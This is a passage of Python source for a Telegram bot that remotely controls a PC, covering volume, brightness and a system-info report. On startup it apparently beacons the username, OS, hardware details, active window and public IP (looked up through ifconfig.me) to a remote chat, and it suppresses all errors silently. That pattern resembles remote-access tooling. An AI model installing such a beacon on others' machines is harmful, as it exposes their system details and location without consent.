            if Sound.__current_volume is None:
                return 0
            else:
                return Sound.__current_volume

        @staticmethod
        def __set_current_volume(volume):
            """
            Current volumne setter
            prevents numbers higher than 100 and numbers lower than 0
            :return: void
            """
            if volume > 100:
                Sound.__current_volume = 100
            elif volume < 0:
                Sound.__current_volume = 0
            else:
                Sound.__current_volume = volume


        # The sound is not muted by default, better tracking should be made
        __is_muted = False

        @staticmethod
        def is_muted():
            """
            Is muted getter
            :return: boolean
            """
            return Sound.__is_muted


        @staticmethod
        def __track():
            """
            Start tracking the sound and mute settings
            :return: void
            """
            if Sound.__current_volume == None:
                Sound.__current_volume = 0
                for i in range(0, 50):
                    Sound.volume_up()

        @staticmethod
        def volume_up():
            """
            Increase system volume
            Done by triggering a fake VK_VOLUME_UP key event
            :return: void
            """
            Sound.__track()
            Sound.__set_current_volume(Sound.current_volume() + 2)
            keyboard.send('volume up')

        @staticmethod
        def volume_down():
            """
            Decrease system volume
            Done by triggering a fake VK_VOLUME_DOWN key event
            :return: void
            """
            Sound.__track()
            Sound.__set_current_volume(Sound.current_volume() - 2)
            keyboard.send('volume down')

        @staticmethod
        def volume_set(amount):
            """
            Set the volume to a specific volume, limited to even numbers.
            This is due to the fact that a VK_VOLUME_UP/VK_VOLUME_DOWN event increases
            or decreases the volume by two every single time.
            :return: void
            """
            Sound.__track()

            if Sound.current_volume() > amount:
                for i in range(0, int((Sound.current_volume() - amount) / 2)):
                    Sound.volume_down()
            else:
                for i in range(0, int((amount - Sound.current_volume()) / 2)):
                    Sound.volume_up()


    def pc_settings(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, '🔧 *You have moved to the PC Settings menu!*', reply_markup=pc_settings_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, pc_settings_check)

    def pc_settings_check(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        if message.text.strip() == back_text: return start(message)
        elif message.text.strip() == '/start': return start(message)
        elif message.text.strip() == settings_pc_menu_change_brightness: return brightness_set(message)
        elif message.text.strip() == settings_pc_menu_change_volume: return volume_set(message)
        elif message.text.strip() == settings_pc_menu_info_pc:
            conn = HTTPConnection("ifconfig.me")
            try:
                conn.request("GET", "/ip")
                ip = conn.getresponse().read()
            except:
                ip = "unknown"

            total_mem, used_mem, free_mem = disk_usage('.')
            gb = 10 ** 9
            login = os.getlogin()
            width, height = pyautogui.size()
            oper = uname()
                
            try: virtual_memory = psutil.virtual_memory()
            except: virtual_memory = 'unknown'
            try: battery = str(psutil.sensors_battery()[0]) + '%'
            except: battery = 'unknown'
            active_window = getActiveWindowTitle()

            if active_window == None or active_window == '': active_window = 'Desktop'
            bot.send_message(ACCESS, f'🧐 The computer is connected!\n\n⏰ Exact startup time: *{startup_time}*\n💾 Username - *{login}*\n🪑 Operating system - *{oper[0]} {oper[2]} {oper[3]}*\n🧮 Processor - *{oper[5]}*\n😻 RAM: *Available {int(virtual_memory[0] / 1e+9)} GB | Loaded {virtual_memory[2]}%*\n🔋 Battery charged at *{battery}*\n🖥 Screen resolution - *{width}x{height}*\n📀 Memory: ' + '*{:6.2f}* GB'.format(total_mem/gb) + " total, left *{:6.2f}* GB".format(free_mem/gb) + f'\n🔑 IP address of the launcher - *{str(ip)[2:-1]}*\n*🖼 Active window - {active_window}*', parse_mode="Markdown")
            return pc_settings(message)

        bot.send_message(message.chat.id, wrong_choice, parse_mode='Markdown')
        return pc_settings(message)


    def volume_set(message: types.Message):
        if is_access_denied(message.from_user): return None
        bot.send_message(message.chat.id, f'🔧 *Enter volume level (0-100)!\n\nCurrent level - {Sound.current_volume()}*', reply_markup=back_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, check_volume_set)

    def check_volume_set(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        level = message.text.strip()
        if level  == back_text: return pc_settings(message)
        elif level == '/start': return start(message)
        elif not message.text.strip().isdigit():
            bot.send_message(message.chat.id, f'❌ *The volume level must be a number!*', parse_mode='Markdown')
            return pc_settings(message)

        if int(level) < 0 or int(level) > 100: return bot.send_message(message.chat.id, f'❌ *The volume level must be greater than 0 and less than 100!*', parse_mode='Markdown')
            
        Sound.volume_set(int(level))
        bot.send_message(message.chat.id, f'✅ You have successfully set the volume level *{level}*!', parse_mode='Markdown')
        return pc_settings(message)


    def brightness_set(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        bot.send_message(message.chat.id, f'🔧 *Enter brightness level (0-100)!\n\nCurrent level - {get_brightness()}*', reply_markup=back_keyboard, parse_mode='Markdown')
        return bot.register_next_step_handler(message, check_brightness_set)

    def check_brightness_set(message: types.Message):
        if is_access_denied(message.from_user): return None
        
        level = message.text.strip()
        if level  == back_text: return pc_settings(message)
        elif level == '/start': return start(message)
        elif not message.text.strip().isdigit():
            bot.send_message(message.chat.id, f'❌ *The brightness level must be a number!*', parse_mode='Markdown')
            return pc_settings(message)

        if int(level) < 0 or int(level) > 100: return bot.send_message(message.chat.id, f'❌ *The brightness level must be greater than 0 and less than 100!*', parse_mode='Markdown')
            
        set_brightness(int(level))
        bot.send_message(message.chat.id, f'✅ You have successfully set the brightness level *{level}*!', parse_mode='Markdown')
        return pc_settings(message)

    if __name__ == '__main__':
        startup_time = datetime.now()
        message = bot.send_message(ACCESS, f'🧐 The computer is connected!\n\n⏰ Exact startup time: *{startup_time}*\n💾 Username - *{login}*\n🪑 Operating system - *{oper[0]} {oper[2]} {oper[3]}*\n🧮 Processor - *{oper[5]}*\n😻 RAM: *Available {int(virtual_memory[0] / 1e+9)} GB | Loaded {virtual_memory[2]}%*\n🔋 Battery charged at *{battery}*\n🖥 Screen resolution - *{width}x{height}*\n📀 Memory: ' + '*{:6.2f}* GB'.format(total_mem/gb) + " total, left *{:6.2f}* GB".format(free_mem/gb) + f'\n🔑 IP address of the launcher - *{str(ip)[2:-1]}*', parse_mode="Markdown")
        mainmenu(message)
        bot.infinity_polling(none_stop = True, skip_pending=True)
except:
    pass